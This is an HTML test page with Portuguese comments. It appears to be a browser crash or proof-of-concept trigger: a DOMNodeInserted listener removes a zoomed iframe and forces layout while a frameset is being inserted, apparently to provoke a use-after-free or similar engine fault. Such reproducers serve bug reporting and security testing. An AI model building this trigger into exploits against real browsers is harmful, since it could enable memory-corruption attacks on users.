
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
  iframe {
    content: url();
    zoom: 0.01;
    width: 20px;
    height: 20px;
  }
</style>
</head>
<body>

<iframe id="i0"></iframe>

<script>
  window.addEventListener('load', () => {
    const i0 = document.getElementById('i0');

    // Dispara código síncrono no exato instante em que o frameset é injetado
    document.documentElement.addEventListener('DOMNodeInserted', (e) => {
      if (e.target.tagName === 'FRAMESET') {
        // Altera o layout e destrói o iframe no meio da árvore de nós
        i0.style.display = 'none';
        i0.remove();
        void document.documentElement.offsetHeight;
      }
    }, false);

    // Gatilho de mutação
    const fs = document.createElement('frameset');
    document.documentElement.appendChild(fs);
  });
</script>
</body>
</html>
